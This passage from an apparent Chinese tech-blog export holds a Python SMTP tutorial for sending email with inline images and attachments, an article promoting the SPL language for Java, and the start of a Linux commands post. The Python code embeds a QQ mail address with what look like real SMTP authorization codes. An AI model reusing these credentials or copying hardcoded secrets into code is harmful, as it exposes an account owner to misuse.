class="keyword">import</span> SMTP</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText  <span class="comment"># 发送文本信息使用的库</span></span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart  <span class="comment"># 可以发送多种类型的邮件</span></span><br><span class="line"><span class="keyword">from</span> email.mime.image <span class="keyword">import</span> MIMEImage  <span class="comment"># 读取图片信息</span></span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header  </span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> formataddr  </span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">receivers = [<span class="string">&#x27;a.l.kun@qq.com&#x27;</span>,]</span><br><span class="line">subject = <span class="string">&#x27;测试邮件&#x27;</span></span><br><span class="line">pic_path = <span class="string">&quot;./test.jpeg&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorate</span>(<span class="params">fun_</span>):</span><br><span class="line">    username = <span class="string">&#x27;3500515050@qq.com&#x27;</span></span><br><span class="line">    password_pass = <span class="string">&#x27;mdsrecuicqjjciei&#x27;</span></span><br><span class="line">    smtp = SMTP(<span class="string">&#x27;smtp.qq.com&#x27;</span>)</span><br><span class="line">    smtp.login(username, password_pass)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(<span class="params">fun_</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_mail</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        fun_(smtp, username, *args, **kwargs)</span><br><span class="line">        smtp.quit()</span><br><span class="line">        smtp.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> func_mail</span><br><span class="line"></span><br><span class="line"><span class="meta">@decorate</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mail</span>(<span class="params">smtp, username</span>):</span><br><span class="line">    <span class="keyword">for</span> receiver_ <span class="keyword">in</span> receivers:</span><br><span class="line">        msgRoot = MIMEMultipart(<span class="string">&quot;related&quot;</span>)  <span class="comment"># 创建一个容器，可以为related模式，可以往里面添加文本、图片、附件</span></span><br><span class="line">        msgRoot[<span class="string">&quot;Subject&quot;</span>] = Header(subject, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        msgRoot[<span class="string">&#x27;From&#x27;</span>] = formataddr((<span class="string">&quot;A.L.Kun&quot;</span>, username))</span><br><span class="line">        msgRoot[<span class="string">&#x27;To&#x27;</span>] = formataddr((receiver_.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>], receiver_))</span><br><span class="line">        pic_data = <span class="built_in">open</span>(pic_path, <span class="string">&quot;rb&quot;</span>).read()  <span class="comment"># 读取图片数据</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;以附件的形式发送图片&quot;&quot;&quot;</span></span><br><span class="line">        send_img_f = MIMEImage(pic_data)</span><br><span class="line">        <span class="comment"># 设置头部信息，第一个参数和第二个参数都表示以附件的形式发送，最后一个表示文件的文件名</span></span><br><span class="line">        <span class="comment"># 只要设置了这个头部信息，就是为发送附件</span></span><br><span class="line">        send_img_f.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;&#x27;</span>, os.path.basename(pic_path)))</span><br><span class="line">        msgRoot.attach(send_img_f)  <span class="comment"># 将图片附件添加到容器中</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;将图片添加到正文中&quot;&quot;&quot;</span></span><br><span class="line">        send_img_c = MIMEImage(pic_data)</span><br><span class="line">        <span class="comment"># 设置图片的唯一标识，即图片的id为img1，通过`cid:img1`访问</span></span><br><span class="line">        send_img_c.add_header(<span class="string">&quot;Content-Id&quot;</span>, <span class="string">&quot;&lt;img1&gt;&quot;</span>)</span><br><span class="line">        msgRoot.attach(send_img_c)  <span class="comment"># 要先将图片数据上传到容器中</span></span><br><span class="line">        img_text = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;p&gt;这是一张图片：&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;&lt;img src=&quot;cid:img1&quot; width=&quot;300&quot; alt=<span class="subst">&#123;os.path.basename(pic_path)&#125;</span>&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>  <span class="comment"># 使用导入的图片数据</span></span><br><span class="line">        msgRoot.attach(MIMEText(img_text, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">        smtp.sendmail(username, receiver_, msgRoot.as_string())</span><br><span class="line">        <span class="built_in">print</span>(receiver_.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>], <span class="string">&#x27;:发送完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mail()</span><br></pre></td></tr></table></figure><h2 id="三、-附件"><a href="#三、-附件" class="headerlink" title="三、 附件"></a>三、 附件</h2><p>我们使用<code>MIMEApplication</code>来发送附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># @author: A.L.Kun</span></span><br><span class="line"><span class="comment"># @file : mail.py</span></span><br><span class="line"><span class="comment"># @time : 2022/5/7 16:48</span></span><br><span class="line"><span class="keyword">from</span> smtplib <span class="keyword">import</span> SMTP</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="keyword">from</span> email.mime.application <span class="keyword">import</span> MIMEApplication  <span class="comment"># 发送二进制附件</span></span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> formataddr</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">receivers = [<span class="string">&#x27;a.l.kun@qq.com&#x27;</span>,]</span><br><span class="line">subject = <span class="string">&#x27;测试邮件&#x27;</span></span><br><span class="line">file_lis = [<span class="string">&quot;./test2.pptx&quot;</span>, <span class="string">&quot;./test.jpeg&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorate</span>(<span class="params">fun_</span>):</span><br><span class="line">    username = <span class="string">&#x27;3500515050@qq.com&#x27;</span></span><br><span class="line">    password_pass = <span class="string">&#x27;mwdftrtycqjjciei&#x27;</span></span><br><span class="line">    smtp = SMTP(<span class="string">&#x27;smtp.qq.com&#x27;</span>)</span><br><span class="line">    smtp.login(username, password_pass)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @wraps(<span class="params">fun_</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_mail</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        fun_(smtp, username, *args, **kwargs)</span><br><span class="line">        smtp.quit()</span><br><span class="line">        smtp.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> func_mail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@decorate</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mail</span>(<span class="params">smtp, username</span>):</span><br><span class="line">    <span class="keyword">for</span> receiver_ <span class="keyword">in</span> receivers:</span><br><span class="line">        msgRoot = MIMEMultipart(<span class="string">&quot;related&quot;</span>)  <span class="comment"># 创建一个容器，必须为related模式，可以往里面添加文本、图片、附件</span></span><br><span class="line">        msgRoot[<span class="string">&quot;Subject&quot;</span>] = Header(subject, <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        msgRoot[<span class="string">&#x27;From&#x27;</span>] = formataddr((<span class="string">&quot;A.L.Kun&quot;</span>, username))</span><br><span class="line">        msgRoot[<span class="string">&#x27;To&#x27;</span>] = formataddr((receiver_.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>], receiver_))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> file_lis:</span><br><span class="line">            <span class="comment"># 创建二进制文件数据</span></span><br><span class="line">            msgFile = MIMEApplication(<span class="built_in">open</span>(file, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">            <span class="comment"># 设置标头</span></span><br><span class="line">            msgFile.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;&#x27;</span>, os.path.basename(file)))</span><br><span class="line">            <span class="comment"># 将数据添加到容器中</span></span><br><span class="line">            msgRoot.attach(msgFile)</span><br><span class="line"></span><br><span class="line">        smtp.sendmail(username, receiver_, msgRoot.as_string())</span><br><span class="line">        <span class="built_in">print</span>(receiver_.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>], <span class="string">&#x27;:发送完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mail()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> 服务器 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 容器 </tag>
            
            <tag> import </tag>
            
            <tag> string </tag>
            
            <tag> qq </tag>
            
            <tag> 邮箱 </tag>
            
            <tag> smtp </tag>
            
            <tag> username </tag>
            
            <tag> receiver_ </tag>
            
            <tag> msgroot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java遇上SPL：架构优势和开发效率，一个不放过</title>
      <link href="/posts/bdd7aac98dac/"/>
      <url>/posts/bdd7aac98dac/</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>摘要：</strong>如果我们在Java中也提供有一套完整的结构化数据处理和计算类库，那这个问题就能得到解决：即享受到架构的优势，又不致于降低开发效率。</p></blockquote><p>本文分享自华为云社区《<a href="https://bbs.huaweicloud.com/blogs/352515?utm_source=cnblog&utm_medium=bbs-ex&utm_campaign=other&utm_content=content">Java结构化处理SPL</a>》，作者：石臻臻的杂货铺。</p><p>现代Java应用架构越来越强调数据存储和处理分离，以获得更好的可维护性、可扩展性以及可移植性，比如火热的微服务就是一种典型。这种架构通常要求业务逻辑要在Java程序中实现，而不是像传统应用架构中放在数据库中。</p><p>应用中的业务逻辑大都会涉及结构化数据处理。数据库（SQL）中对这类任务有较丰富的支持，可以相对简易地实现业务逻辑。但Java却一直缺乏这类基础支持，导致用Java实现业务逻辑非常繁琐低效。结果，虽然架构上有各种优势，但开发效率却反而大幅下降了。</p><p>如果我们在Java中也提供有一套完整的结构化数据处理和计算类库，那这个问题就能得到解决：即享受到架构的优势，又不致于降低开发效率。</p><h2 id="需要什么样的能力？"><a href="#需要什么样的能力？" class="headerlink" title="需要什么样的能力？"></a>需要什么样的能力？</h2><p>Java下理想的结构化数据处理类库应当具备哪些特征呢？我们可以从SQL来总结：</p><h3 id="1-集合运算能力"><a href="#1-集合运算能力" class="headerlink" title="1 集合运算能力"></a>1 集合运算能力</h3><p>结构化数据经常是批量（以集合形式）出现的，为了方便地计算这类数据，有必要提供足够的集合运算能力。</p><p>如果没有集合运算类库，只有数组（相当于集合）这种基础数据类型，我们要对集合成员做个简单地求和也需要写四五行循环语句才能完成，过滤、分组聚合等运算则要写出数百行代码了。</p><p>SQL提供有较丰富的集合运算，如 SUM&#x2F;COUNT 等聚合运算，WHERE 用于过滤、GROUP 用于分组，也支持针对集合的交、并、差等基本运算。这样写出来的代码就会短小很多。</p><h3 id="2-Lambda语法"><a href="#2-Lambda语法" class="headerlink" title="2 Lambda语法"></a>2 Lambda语法</h3><p>有了集合运算能力是否就够了呢？假如我们为 Java 开发一批的集合运算类库，是否就可以达到 SQL 的效果呢？</p><p>没有这么简单！</p><p>以过滤运算为例。过滤通常需要一个条件，把满足条件的集合成员保留。在 SQL 中这个条件是以一个表达式形式出现的，比如写 WHERE x&gt;0，就表示保留那些使得 x&gt;0 计算结果为真的成员。这个表达式 x&gt;0 并不是在执行这个语句之前先计算好的，而是在遍历时针对每个集合成员计算的。本质上，这个表达式本质上是一个函数，是一个以当前集合成员为参数的函数。对于 WHERE 运算而言，相当于把一个用表达式定义的函数用作了 WHERE 的参数。</p><p>这种写法有一个术语叫做 Lambda 语法，或者叫函数式语言。</p><p>如果没有 Lambda 语法，我们就要经常临时定义函数，代码会非常繁琐，还容易发生名字冲突。</p><p>SQL中大量使用了 Lambda 语法，不在于必须过滤、分组运算中，在计算列等不必须的场景也可以使用，大大简化了代码。</p><h3 id="3-在-Lambda-语法中直接引用字段"><a href="#3-在-Lambda-语法中直接引用字段" class="headerlink" title="3 在 Lambda 语法中直接引用字段"></a>3 在 Lambda 语法中直接引用字段</h3><p>结构化数据并非简单的单值，而是带有字段的记录。</p><p>我们发现，SQL 的表达式参数中引用记录字段时，大多数情况可以直接使用字段名称而不必指明字段所属的记录，只有在多个同名字段时才需要冠以表名（或别名）以区分。</p><p>新版本的 Java 虽然也开始支持 Lambda 语法了，但只能把当前记录作为参数传入这个用 Lambda 语法定义的函数，然后再写计算式时就总要带上这个记录。比如用单价和数量计算金额时，如果用于表示当前成员的参数名为 x，则需要写成“x. 单价 *x. 数量”这种啰嗦的形式。而在 SQL 中可以更为直观地写成 “ 单价 * 数量”。</p><h3 id="4-动态数据结构"><a href="#4-动态数据结构" class="headerlink" title="4 动态数据结构"></a>4 动态数据结构</h3><p>SQL还能很好地支持动态数据结构。</p><p>结构化数据计算中，返回值经常也是有结构的数据，而结果数据结构和运算相关，没办法在代码编写之前就先准备好。所以需要支持动态的数据结构能力。</p><p>SQL中任何一个 SELECT 语句都会产生一个新的数据结构，在代码中可以随意添加删除字段，而不必事先定义结构（类）。Java 这类语言则不行，在代码编译阶段就要把用到的结构（类）都定义好，原则上不能在执行过程中动态产生新的结构。</p><h3 id="5-解释型语言"><a href="#5-解释型语言" class="headerlink" title="5 解释型语言"></a>5 解释型语言</h3><p>从前面几条的分析，我们已经可以得到结论：Java 本身并不适合用作结构化数据处理的语言。它的 Lambda 机制不支持特征 3，而且作为编译型语言，也不能实现特征 4。</p><p>其实，前面说到的 Lambda 语法也不太适合采用编译型语言来实现。编译器不能确定这个写到参数位置的表达式是应该当场计算出表达式的值再传递，还是把整个表达式编译成一个函数传递，需要再设计更多的语法符号加以区分。而解释型语言则没有这个问题，作为参数的表达式是先计算还是遍历集合成员时再计算，可以由函数本身来决定。</p><p>SQL确实是解释型语言。</p><h2 id="引入-SPL"><a href="#引入-SPL" class="headerlink" title="引入 SPL"></a>引入 SPL</h2><p><strong>Stream</strong>是Java8以官方身份推出的结构化数据处理类库，但并不符合上述的要求。它没有专业的结构化数据类型，缺乏很多重要的结构化数据计算函数，不是解释型语言，不支持动态数据类型，Lambda语法的接口复杂。</p><p><strong>Kotlin</strong>属于Java生态系统的一部分，它在Stream的基础上进行了小幅改进，也提供了结构化数据计算类型，但因为结构化数据计算函数不足，不是解释型语言，不支持动态数据类型，Lambda语法的接口复杂，仍然不是理想的结构化数据计算类库。</p><p><strong>Scala</strong>提供了较丰富的结构化数据计算函数，但编译型语言的特点，也使它不能成为理想的结构化数据计算类库。</p><p>那么，Java生态下还有什么可以用呢？</p><p>集算器SPL。</p><p>SPL是由Java解释执行的程序语言，具备丰富的结构化数据计算类库、简单的Lambda语法和方便易用的动态数据结构，是Java理想的结构化处理类库。</p><h2 id="丰富的集合运算函数"><a href="#丰富的集合运算函数" class="headerlink" title="丰富的集合运算函数"></a>丰富的集合运算函数</h2><p>SPL提供了专业的结构化数据类型，即序表。和SQL的数据表一样，序表是批量记录组成的集合，具有结构化数据类型的一般功能，下面举例说明。</p><p>解析源数据并生成序表：</p><p>Orders&#x3D;T(“d:&#x2F;Orders.csv”)</p><p>按列名从原序表生成新的序表：</p><p>Orders.new(OrderID, Amount, OrderDate)</p><p>计算列：</p><p>Orders.new(OrderID, Amount, year(OrderDate))</p><p>字段改名：</p><p>Orders.new(OrderID:ID, SellerId, year(OrderDate):y)</p><p>按序号使用字段：</p><p>Orders.groups(year(_5),_2; sum(_4))</p><p>序表改名（左关联）</p><p>join@1(Orders:o,SellerId ; Employees:e,EId).groups(e.Dept; sum(o.Amount))</p><p>序表支持所有的结构化计算函数，计算结果也同样是序表，而不是Map之类的数据类型。比如对分组汇总的结果，继续进行结构化数据处理：</p><p>Orders.groups(year(OrderDate):y; sum(Amount):m).new(y:OrderYear, m*0.2:discount)</p><p>在序表的基础上，SPL提供了丰富的结构化数据计算函数，比如过滤、排序、分组、去重、改名、计算列、关联、子查询、集合计算、有序计算等。这些函数具有强大的计算能力，无须硬编码辅助，就能独立完成计算：</p><p>组合查询：</p><p>Orders.select(Amount&gt;1000 &amp;&amp; Amount&lt;&#x3D;3000 &amp;&amp; like(Client,”*bro*“))</p><p>排序：</p><p>Orders.sort(-Client,Amount)</p><p>分组汇总：</p><p>Orders.groups(year(OrderDate),Client; sum(Amount))</p><p>内关联：</p><p>join(Orders:o,SellerId ; Employees:e,EId).groups(e.Dept; sum(o.Amount))</p><h3 id="简洁的Lambda语法"><a href="#简洁的Lambda语法" class="headerlink" title="简洁的Lambda语法"></a>简洁的Lambda语法</h3><p>SPL支持简单的Lambda语法，无须定义函数名和函数体，可以直接用表达式当作函数的参数，比如过滤：</p><p>Orders.select(Amount&gt;1000)</p><p>修改业务逻辑时，也不用重构函数，只须简单修改表达式：</p><p>Orders.select(Amount&gt;1000 &amp;&amp; Amount&lt;2000)</p><p>SPL是解释型语言，使用参数表达式时不必明确定义参数类型，使Lambda接口更简单。比如计算平方和，想在sum的过程中算平方，可以直观写作：</p><p>Orders.sum(Amount*Amount)</p><p>和SQL类似，SPL语法也支持在单表计算时直接使用字段名：</p><p>Orders.sort(-Client, Amount)</p><h3 id="动态数据结构"><a href="#动态数据结构" class="headerlink" title="动态数据结构"></a>动态数据结构</h3><p>SPL是解释型语言，天然支持动态数据结构，可以根据计算结果结构动态生成新序表。特别适合计算列、分组汇总、关联这类计算，比如直接对分组汇总的结果再计算：</p><p>Orders.groups(Client;sum(Amount):amt).select(amt&gt;1000 &amp;&amp; like(Client,”*S*“))</p><p>或直接对关联计算的结果再计算：</p><p>join(Orders:o,SellerId ; Employees:e,Eid).groups(e.Dept; sum(o.Amount))</p><p>较复杂的计算通常都要拆成多个步骤，每个中间结果的数据结构几乎都不同。SPL支持动态数据结构，不必先定义这些中间结果的结构。比如，根据某年的客户回款记录表，计算每个月的回款额都在前10名的客户：</p><p>Sales2021.group(month(sellDate)).(<del>.groups(Client;sum(Amount):sumValue)).(</del>.sort(-sumValue)) .(<del>.select(#&lt;&#x3D;10)).(</del>.(Client)).isect()</p><h3 id="直接执行SQL"><a href="#直接执行SQL" class="headerlink" title="直接执行SQL"></a>直接执行SQL</h3><p>SPL中还实现了SQL的解释器，可以直接执行SQL，从基本的WHERE、GROUP到JOIN、甚至WITH都能支持：</p><p>$select * from d:&#x2F;Orders.csv where (OrderDate&lt;date(‘2020-01-01’) and Amount&lt;&#x3D;100)or (OrderDate&gt;&#x3D;date(‘2020-12-31’) and Amount&gt;100)<br>$select year(OrderDate),Client ,sum(Amount),count(1) from d:&#x2F;Orders.csv<br>group by year(OrderDate),Client<br>having sum(Amount)&lt;&#x3D;100<br>$select o.OrderId,o.Client,e.Name e.Dept from d:&#x2F;Orders.csv o<br>join d:&#x2F;Employees.csv e on o.SellerId&#x3D;e.Eid<br>$with t as (select Client ,sum(amount) s from d:&#x2F;Orders.csv group by Client)<br>select t.Client, t.s, ct.Name, ct.address from t<br>left join ClientTable ct on t.Client=ct.Client</p><h2 id="更多语言优势"><a href="#更多语言优势" class="headerlink" title="更多语言优势"></a>更多语言优势</h2><p>作为专业的结构化数据处理语言，SPL不仅覆盖了SQL的所有计算能力，在语言方面，还有更强大的优势：</p><h3 id="离散性及其支挂下的更彻底的集合化"><a href="#离散性及其支挂下的更彻底的集合化" class="headerlink" title="离散性及其支挂下的更彻底的集合化"></a>离散性及其支挂下的更彻底的集合化</h3><p>集合化是SQL的基本特性，即支持数据以集合的形式参与运算。但SQL的离散性很不好，所有集合成员必须作为一个整体参于运算，不能游离在集合之外。而Java等高级语言则支持很好的离散性，数组成员可以单独运算。</p><p>但是，更彻底的集合化需要离散性来支持，集合成员可以游离在集合之外，并与其它数据随意构成新的集合参与运算 。</p><p>SPL兼具了SQL的集合化和Java的离散性，从而可以实现更彻底的集合化。</p><p>比如，SPL中很容易表达“集合的集合”，适合<strong>分组后计算</strong>。比如，找到各科成绩均在前10名的学生：</p><p><img src="https://static.luozhinet.com/17/8f6c57981e7014afefb518fc38e2ae"></p><p>SPL序表的字段可以存储记录或记录集合，这样可以用<strong>对象引用</strong>的方式，直观地表达关联关系，即使关系再多，也能直观地表达。比如，根据员工表找到女经理下属的男员工：</p><p>Employees.select(性别:”男”,部门.经理.性别:”女”)</p><p><strong>有序计算</strong>是离散性和集合化的典型结合产物，成员的次序在集合中才有意义，这要求集合化，有序计算时又要将每个成员与相邻成员区分开，会强调离散性。SPL兼具集合化和离散性，天然支持有序计算。</p><p>具体来说，SPL可以按绝对位置引用成员，比如，取第3条订单可以写成Orders(3)，取第1、3、5条记录可以写成Orders([1,3,5])。</p><p>SPL也可以按相对位置引用成员，比如，计算每条记录相对于上一条记录的金额增长率：Orders.derive(amount&#x2F;amount[-1]-1)</p><p>SPL还可以用#代表当前记录的序号，比如把员工按序号分成两组，奇数序号一组，偶数序号一组：Employees.group(#%2&#x3D;&#x3D;1)</p><h3 id="更方便的函数语法"><a href="#更方便的函数语法" class="headerlink" title="更方便的函数语法"></a>更方便的函数语法</h3><p>大量功能强大的结构化数据计算函数，这本来是一件好事，但这会让相似功能的函数不容易区分。无形中提高了学习难度。</p><p>SPL提供了特有的函数选项语法，功能相似的函数可以共用一个函数名，只用<strong>函数选项</strong>区分差别。比如select函数的基本功能是过滤，如果只过滤出符合条件的第1条记录，只须使用选项@1：</p><p>Orders.select@1(Amount&gt;1000)</p><p>数据量较大时，用并行计算提高性能，只须改为选项@m：</p><p>Orders.select@m(Amount&gt;1000)</p><p>对排序过的数据，用二分法进行快速过滤，可用@b：</p><p>Orders.select@b(Amount&gt;1000)</p><p>函数选项还可以组合搭配，比如：</p><p>Orders.select@1b(Amount&gt;1000)</p><p>结构化运算函数的参数常常很复杂，比如SQL就需要用各种关键字把一条语句的参数分隔成多个组，但这会动用很多关键字，也使语句结构不统一。</p><p>SPL支持<strong>层次参数</strong>，通过分号、逗号、冒号自高而低将参数分为三层，用通用的方式简化复杂参数的表达：</p><p>join(Orders:o,SellerId ; Employees:e,EId)</p><h3 id="扩展的Lambda语法"><a href="#扩展的Lambda语法" class="headerlink" title="扩展的Lambda语法"></a>扩展的Lambda语法</h3><p>普通的Lambda语法不仅要指明表达式（即函数形式的参数），还必须完整地定义表达式本身的参数，否则在数学形式上不够严密，这就让Lambda语法很繁琐。比如用循环函数select过滤集合A，只保留值为偶数的成员，一般形式是：</p><p>A.select(f(x):{x%2=&#x3D;0} )</p><p>这里的表达式是x%2&#x3D;&#x3D;0，表达式的参数是f(x)里的x，x代表集合A里的成员，即循环变量。</p><p>SPL用<strong>固定符号~代表循环变量</strong>，当参数是循环变量时就无须再定义参数了。在SPL中，上面的Lambda语法可以简写作：A.select(~ %2&#x3D;&#x3D;0)</p><p>普通Lambda语法必须定义表达式用到的每一个参数，除了循环变量外，常用的参数还有循环计数，如果把循环计数也定义到Lambda中，代码就更繁琐了。</p><p>SPL用<strong>固定符号#代表循环计数变量</strong>。比如，用函数select过滤集合A，只保留序号是偶数的成员，SPL可以写作：A.select(# %2&#x3D;&#x3D;0)</p><p>相对位置经常出现在难度较大的计算中，而且相对位置本身就很难计算，当要使用相对位置时，参数的写法将非常繁琐。</p><p>SPL用<strong>固定形式[序号]代表相对位置</strong>：</p><p><img src="https://static.luozhinet.com/8b/c4354186c769a961efdd18235c78ef"></p><h2 id="无缝集成、低耦合、热切换"><a href="#无缝集成、低耦合、热切换" class="headerlink" title="无缝集成、低耦合、热切换"></a>无缝集成、低耦合、热切换</h2><p>作为用Java解释的脚本语言，SPL提供了JDBC驱动，可以无缝集成进Java应用程中。</p><p>简单语句可以像SQL一样直接执行：</p><p>…<br>Class.forName(“com.esproc.jdbc.InternalDriver”);<br>Connection conn =DriverManager.getConnection(“jdbc:esproc:local:&#x2F;&#x2F;“);<br>PrepareStatement st = conn.prepareStatement(“=T(\“D:&#x2F;Orders.txt\“).select(Amount&gt;1000 &amp;&amp; Amount&lt;&#x3D;3000 &amp;&amp; like(Client,\“*S*\“))”);<br>ResultSet result=st.execute();<br>…</p><p>复杂计算可以存成脚本文件，以存储过程方式调用</p><p>…<br>Class.forName(“com.esproc.jdbc.InternalDriver”);<br>Connection conn =DriverManager.getConnection(“jdbc:esproc:local:&#x2F;&#x2F;“);<br>Statement st = connection.();<br>CallableStatement st = conn.prepareCall(“{call splscript1(?, ?)}”);<br>st.setObject(1, 3000);<br>st.setObject(2, 5000);<br>ResultSet result=st.execute();<br>…</p><p>将脚本外置于Java程序，一方面可以降低代码耦合性，另一方面利用解释执行的特点还可以支持热切换，业务逻辑变动时只要修改脚本即可立即生效，不像使用Java时常常要重启整个应用。这种机制特别适合编写微服务架构中的业务处理逻辑。</p><h2 id="SPL资料"><a href="#SPL资料" class="headerlink" title="SPL资料"></a>SPL资料</h2><ul><li>SPL官网</li><li>SPL下载</li><li><a href="https://github.com/SPLWare/esProc">SPL源代码</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应用 </tag>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 计算 </tag>
            
            <tag> 客户 </tag>
            
            <tag> o </tag>
            
            <tag> 修改 </tag>
            
            <tag> 运算 </tag>
            
            <tag> new </tag>
            
            <tag> sum </tag>
            
            <tag> lambda </tag>
            
            <tag> spl </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 实用命令</title>
      <link href="/posts/9792de8b38a6/"/>
      <url>/posts/9792de8b38a6/</url>
      
        <content type="html"><![CDATA[<h2 id="实用命令："><a href="#实用命令：" class="headerlink" title="实用命令："></a>实用命令：</h2><h3 id="1、查看端口占用情况"><a href="#1、查看端口占用情况" class="headerlink" title="1、查看端口占用情况"></a>1、查看端口占用情况</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看该端口是否被占用</span></span><br><span class="line">netstat -lnp|grep 5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看端口是否被占用</span></span><br><span class="line">lsof -i:<span class="string">&#x27;5000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 杀死端口占用进程，根据进程号杀死</span></span><br><span class="line"><span class="built_in">kill</span> -9 28533</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次查看，如果查看时候提示命令不存在 ：</span></span><br><span class="line"><span class="comment"># 需要先安装一下命令</span></span><br><span class="line">yum -y install net-tools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最常见的还有防火墙</span></span><br><span class="line">yum install firewalld</span><br></pre></td></tr></table></figure><h3 id="2、查看空间使用清理"><a href="#2、查看空间使用清理" class="headerlink" title="2、查看空间使用清理"></a>2、查看空间使用清理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span 